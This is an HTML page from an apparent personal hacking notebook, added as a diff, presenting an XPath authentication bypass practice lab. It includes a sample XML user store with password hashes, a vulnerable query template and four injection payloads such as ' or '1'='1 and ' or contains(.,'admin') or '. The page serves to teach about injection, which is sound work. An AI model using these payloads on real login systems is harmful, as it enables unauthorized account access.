@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XPath Authentication Bypass - 0xseanshin Hacking Notebook</title>
+    <link rel="stylesheet" href="../../style.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-brand">0xseanshin Hacking Notebook</div>
+        <div class="nav-links">
+            <a href="../../index.html">Home</a>
+            <a href="#" class="active">Injections</a>
+            <a href="#" class="current">XPath</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="sidebar">
+            <div class="topic-list">
+                <div class="topic">
+                    <div class="topic-header" onclick="toggleTopic(this)">
+                        <i class="fas fa-chevron-right"></i>
+                        XPath Tutorials
+                    </div>
+                    <div class="topic-content">
+                        <a href="../xpath_query/index.html">XPath Query Basics</a>
+                        <a href="../xpath_query_pg/index.html">Query Practice</a>
+                        <a href="#" class="active">Auth Bypass Lab</a>
+                    </div>
+                </div>
+                
+                <div class="topic">
+                    <div class="topic-header" onclick="toggleTopic(this)">
+                        <i class="fas fa-chevron-right"></i>
+                        Bypass Techniques
+                    </div>
+                    <div class="topic-content">
+                        <a href="#basic-bypass">Basic Bypass</a>
+                        <a href="#xpath-functions">XPath Functions</a>
+                        <a href="#position-based">Position Based</a>
+                        <a href="#pattern-search">Pattern Search</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="content-header">
+                <h1>XPath Authentication Bypass Lab</h1>
+                <div class="breadcrumb">
+                    <a href="../../index.html">Home</a> &gt;
+                    <a href="../../index.html#xpath">XPath</a> &gt;
+                    <span>Auth Bypass Lab</span>
+                </div>
+            </div>
+
+            <div class="lab-container">
+                <section class="login-section">
+                    <h2>Login Form</h2>
+                    <div class="login-form">
+                        <input type="text" id="username" placeholder="Username" class="code-input">
+                        <input type="password" id="password" placeholder="Password" class="code-input">
+                        <button class="btn" onclick="authenticate()">Login</button>
+                    </div>
+                    <div id="login-result"></div>
+                </section>
+
+                <section class="xml-viewer">
+                    <h2>XML Database</h2>
+                    <div class="code-block">
+                        <pre id="xml-content">
+&lt;users&gt;
+    &lt;user&gt;
+        &lt;name first="Kaylie" last="Grenvile"/&gt;
+        &lt;id&gt;1&lt;/id&gt;
+        &lt;username&gt;kgrenvile&lt;/username&gt;
+        &lt;password&gt;8a24367a1f46c141048752f2d5bbd14b&lt;/password&gt;
+    &lt;/user&gt;
+    &lt;user&gt;
+        &lt;name first="Admin" last="Admin"/&gt;
+        &lt;id&gt;2&lt;/id&gt;
+        &lt;username&gt;obfuscatedadminuser&lt;/username&gt;
+        &lt;password&gt;21232f297a57a5a743894a0e4a801fc3&lt;/password&gt;
+    &lt;/user&gt;
+    &lt;user&gt;
+        &lt;name first="Academy" last="Student"/&gt;
+        &lt;id&gt;3&lt;/id&gt;
+        &lt;username&gt;htb-stdnt&lt;/username&gt;
+        &lt;password&gt;295362c2618a05ba3899904a6a3f5bc0&lt;/password&gt;
+    &lt;/user&gt;
+&lt;/users&gt;
+                        </pre>
+                    </div>
+                </section>
+
+                <section class="xpath-query">
+                    <h2>XPath Query</h2>
+                    <div class="code-block">
+                        <pre id="xpath-display">
+/users/user[username/text()='$USERNAME' and password/text()='$PASSWORD']
+                        </pre>
+                    </div>
+                </section>
+
+                <section class="payloads">
+                    <h2>Common Payloads</h2>
+                    <div class="payload-grid">
+                        <div class="payload-item" id="basic-bypass" onclick="setPayload(this)">
+                            <div class="payload-header">
+                                <h3>Basic Bypass</h3>
+                                <code>' or '1'='1</code>
+                            </div>
+                            <p>Simple authentication bypass using OR condition</p>
+                        </div>
+
+                        <div class="payload-item" id="xpath-functions" onclick="setPayload(this)">
+                            <div class="payload-header">
+                                <h3>XPath Functions</h3>
+                                <code>' or true() or '</code>
+                            </div>
+                            <p>Bypass using XPath's built-in functions</p>
+                        </div>
+
+                        <div class="payload-item" id="position-based" onclick="setPayload(this)">
+                            <div class="payload-header">
+                                <h3>Position Based</h3>
+                                <code>' or position()=2 or '</code>
+                            </div>
+                            <p>Target specific user by their position</p>
+                        </div>
+
+                        <div class="payload-item" id="pattern-search" onclick="setPayload(this)">
+                            <div class="payload-header">
+                                <h3>Pattern Search</h3>
+                                <code>' or contains(.,'admin') or '</code>
+                            </div>
+                            <p>Search for users matching specific patterns</p>
+                        </div>
+                    </div>
+                </section>
+            </div>
+        </div>
+    </div>
+
+    <script src="../../script.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
